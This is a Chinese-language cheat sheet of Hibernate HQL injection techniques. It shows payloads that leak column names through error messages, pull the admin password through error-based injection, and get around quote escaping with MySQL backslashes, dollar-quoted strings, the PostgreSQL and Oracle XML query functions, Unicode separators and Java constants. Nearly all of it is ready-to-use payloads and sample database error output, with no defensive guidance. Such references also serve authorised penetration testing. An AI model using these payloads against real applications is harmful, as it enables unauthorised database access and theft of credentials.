## 查询语句

### 列出列值
```sql
from BlogPosts
where title like '%'
  and DOESNT_EXIST=1 and ''='%'--
  and published = true
```

使用不存在的列将引发泄漏多个列名称的异常

```bash
org.hibernate.exception.SQLGrammarException: Column "DOESNT_EXIST" not found; SQL statement:
      select blogposts0_.id as id21_, blogposts0_.author as author21_, blogposts0_.promoCode as promo3_21_, blogposts0_.title as title21_, blogposts0_.published as published21_ from BlogPosts blogposts0_ where blogposts0_.title like '%' or DOESNT_EXIST='%' and blogposts0_.published=1 [42122-159]
```

### 报错注入

1.
```sql
from BlogPosts
where title like '%11'
  and (select password from User where username='admin')=1
  or ''='%'
  and published = true
```

2.
```sql
Data conversion error converting "d41d8cd98f00b204e9800998ecf8427e"; SQL statement:
select blogposts0_.id as id18_, blogposts0_.author as author18_, blogposts0_.promotionCode as promotio3_18_, blogposts0_.title as title18_, blogposts0_.visible as visible18_ from BlogPosts blogposts0_ where blogposts0_.title like '%11' and (select user1_.password from User user1_ where user1_.username = 'admin')=1 or ''='%' and blogposts0_.published=1
```

### 单引号转义

该方法适用于 MySQL DBMS，它使用 SLASH 转义字符串中的单引号\'.

在 HQL 中，单引号在字符串中通过加倍转义.
```sql
'abc\''or 1=(select 1)--'
```

在HQL中它是一个字符串，在MySQL中它是一个字符串和附加的SQL表达式。

### $引用字符串

该方法适用于允许在 SQL 表达式中使用 DOLLAR-QUOTED 字符串的 DBMS：PostgreSQL、H2。

Hibernate ORM 允许$$.
```sql
$$='$$=concat(chr(61),chr(39)) and 1=1--'
```

### DBMS魔法函数

该方法适用于具有魔法函数功能的 DBMS，这些功能可以评估字符串参数中的 SQL 表达式：PostgreSQL、Oracle。

Hibernate 允许在 HQL 表达式中指定任何函数名称。

PostgreSQL 有内置函数query_to_xml('Arbitrary SQL').
```sql
array_upper(xpath('row',query_to_xml('select 1 where 1337>1', true, false,'')),1)
```

Oracle有内置函数DBMS_XMLGEN.getxml('SQL')
```sql
NVL(TO_CHAR(DBMS_XMLGEN.getxml('select 1 where 1337>1')),'1')!='1'
```

### Unicode

该方法适用于允许在 SQL 标记之间使用 UNICODE 分隔符（例如 U+00A0）的 DBMS：Microsoft SQL Server、H2。

在 Microsoft SQL SERVER 中，SELECT LEN([U+00A0](select[U+00A0](1))原理与SELECT LEN((SELECT(1)));一样

HQL 允许在标识符（函数或参数名称）中使用 UNICODE 符号。

```sql
SELECT p FROM hqli.persistent.Post p where p.name='dummy' or 1<LEN( (select top 1 name from users)) or '1'='11'
```

### Java常量

该方法适用于大多数 DBMS（不适用于 MySQL）。

Hibernate 解析 HQL 查询中的 Java 公共静态字段（Java 常量）：

> + 具有 Java 常量的类必须位于类路径中
> + 例如java.lang.Character.SIZE解析为16
> + 字符串或字符常量另外用单引号括起来

要使用 JAVA CONSTANTS 方法，我们需要在类路径上的类或接口中声明特殊的字符或字符串字段.
```sql
public class Constants {
    public static final String S_QUOTE = "'";
    public static final String HQL_PART = "select * from Post where name = '";
    public static final char C_QUOTE_1 = '\'';
    public static final char C_QUOTE_2 = '\047';
    public static final char C_QUOTE_3 = 39;
    public static final char C_QUOTE_4 = 0x27;
    public static final char C_QUOTE_5 = 047;
}
```

Java 库中的一些可用常量：
```bash
org.apache.batik.util.XMLConstants.XML_CHAR_APOS         [ Apache Batik ]
com.ibm.icu.impl.PatternTokenizer.SINGLE_QUOTE           [ ICU4J ]
jodd.util.StringPool.SINGLE_QUOTE                        [ Jodd ]
ch.qos.logback.core.CoreConstants.SINGLE_QUOTE_CHAR      [ Logback ]
cz.vutbr.web.csskit.OutputUtil.STRING_OPENING            [ jStyleParser ]
com.sun.java.help.impl.DocPConst.QUOTE                   [ JavaHelp ]
org.eclipse.help.internal.webapp.utils.JSonHelper.QUOTE  [ EclipseHelp ]
```

例如：

```sql
dummy' and hqli.persistent.Constants.C_QUOTE_1*X('<>CHAR(41) and (select count(1) from sysibm.sysdummy1)>0 --')=1 and '1'='1
```
